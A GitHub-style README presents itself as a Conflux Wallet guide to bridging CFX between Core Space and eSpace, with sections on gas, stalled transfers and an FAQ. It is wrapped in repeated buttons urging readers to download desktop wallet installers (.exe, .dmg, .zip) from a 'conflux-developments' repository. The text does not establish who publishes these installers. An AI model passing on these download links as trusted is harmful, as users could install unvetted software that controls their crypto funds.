![Conflux Wallet](assets/banner-article.png)

# Bridge CFX Across Spaces

<p align="center">Bridge CFX Across Spaces: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** CFX moves between Core Space and eSpace through the network's cross-space mechanism, not an ordinary transfer. Core to eSpace completes in one step. eSpace to Core takes two: a transfer to a derived address, then a withdrawal from the Core Side. Both directions need gas, and the return trip needs it on both sides.

## What bridging means on Conflux

The two spaces are separate ledgers on one network, so moving value between them is an operation the protocol performs rather than a payment you send. The mechanism locks or credits on one side and releases on the other, and it is the only supported route between a `cfx:` account and a `0x` account.

That is why a normal send cannot do it. Pasting a `cfx:` address into an eSpace transfer is not a bridge; it is a mismatch the network will not honour. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md explains why the two accounts are separate in the first place.

## Core Space to eSpace in one step

This direction is the simple one. From the Core Space account you call the cross-space transfer with the destination eSpace address, and it executes as a single atomic step: either the whole move happens or none of it does. The Core Space sender pays the gas.

Because it is atomic, there is no half-finished state to chase. If the transaction succeeded, the funds are on the eSpace side; if it failed, they never left. That makes it the direction to practise on if you are new to the mechanism.

## eSpace to Core Space in two steps

The return trip is the one that catches people. Step one sends CFX in an eSpace transaction to a derived address that represents your Core Space account. Step two, from that Core Space account, withdraws the balance - and until step two happens, the funds sit in an intermediate state that looks like a loss.

Two consequences follow. You need eSpace CFX to pay for step one and Core Space CFX to pay for step two, and an account that has just been emptied has nothing to pay with. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-bridge-gas-fees.md covers the fee side in detail.

## Which side pays the gas

Each leg is paid on the side it happens. Moving into eSpace costs gas in the Core Space account you are sending from; moving out costs eSpace gas for the first leg and Core Space gas for the withdrawal. There is no single fee that covers both directions.

This is the most common reason a return transfer stalls: the user moved everything, leaving nothing to pay for the final step. Keep a small amount of CFX on the destination side before you start, and the second leg becomes routine.

## How long a transfer takes

A one-step Core to eSpace transfer completes with the transaction that carries it, so it is as fast as any other transaction on the network. The two-step return depends on both legs being sent, which means the clock is really about when you send the second one.

Nothing expires while you wait, but nothing progresses either. A transfer that looks stuck is usually waiting for a step that has not been sent, not for the network to catch up - which is why the first check is always whether both legs exist.

## Why a transfer can stall half-way

The intermediate state is the whole risk of this operation. If step one succeeds and step two is never sent - because the app closed, because the user assumed it was finished, or because there was no gas left - the value sits between the spaces, visible on neither balance in the way the user expects.

This is a state problem, not a loss. The funds are still attributable to your account and the second leg can still be sent. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-wallet-bridge-stuck.md covers the recovery path step by step.

## What to check when it stalls

Look for the transaction hashes before anything else. A bridge that shows one hash has completed one leg; a bridge that shows none never started. That single observation tells you whether you are waiting or whether you need to act.

Then check gas on the side that still needs to act, and confirm you are looking at the right space in the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14). Most "stuck bridge" reports resolve into one of those two, and neither is a reason to send the transfer again.

## Sending to a wrong-space address

If you send CFX to a `0x` address from Core Space, or the reverse, the protocol does not convert anything: the transfer either fails at submission or lands in an account the recipient does not control in the way they expected. Recovery then depends entirely on the receiving side.

Do not resend to "fix" it. Two wrong transfers are worse than one, and the second usually goes to the same place. https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-cfx-wrong-network.md covers the options, which are narrower than most people hope.

## Bridging from another chain

Moving tokens onto Conflux from a different network is a separate operation from moving between the two spaces, and it is not something a wallet performs on its own. The usual routes are an exchange withdrawal to the right space, or a third-party bridge that supports the pair of chains you need.

Whichever you use, the destination format has to match the space you intend to land in. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-address-formats-cfx-vs-0x.md is the check to run before you approve anything, and it takes ten seconds. This is a maintained product: the current release published on the release page is where fixes and support land.

## FAQ

### How do I bridge CFX from Core Space to eSpace?

Send it through the network's cross-space mechanism with your eSpace address as the destination. It completes in one atomic step and the Core Space sender pays the gas.

### Can I send CFX from a Core address to an eSpace address directly?

No. A plain transfer between formats is not a bridge and the network will not honour it. The cross-space mechanism is the only route.

### Why is my eSpace to Core transfer stuck?

Because the second leg has not been sent. The first leg moves the value to an intermediate state; the withdrawal from the Core Space account completes it, and that withdrawal needs Core Space gas.

### Which side pays the gas?

Each leg on its own side. Core to eSpace is paid on Core; the return trip needs eSpace gas for the first leg and Core Space gas for the withdrawal.

### How long does a bridge transfer take?

The one-step direction completes with its transaction. The two-step direction takes as long as the gap between sending the two legs, because nothing progresses until the second is sent.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [Bridge Transfer Stuck](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-wallet-bridge-stuck.md)
- [Bridge Gas and Fees](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-bridge-gas-fees.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
